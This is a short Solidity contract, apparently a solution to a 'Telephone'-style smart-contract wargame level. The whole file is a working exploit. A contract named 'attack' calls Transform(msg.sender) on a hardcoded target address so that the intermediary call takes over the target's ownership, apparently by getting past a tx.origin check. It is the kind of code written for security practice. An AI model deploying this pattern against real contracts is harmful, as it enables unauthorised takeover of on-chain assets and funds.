// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

interface Telephone_part4 {
    function Transform(address _owner) external ;
}
contract attack{
   Telephone_part4 private target=Telephone_part4(0x0C11b2BD8cE3d56F48E38AE2dd3Cf05018b7FEc4);
   function attackowner() public {
       target.Transform(msg.sender);
   }
}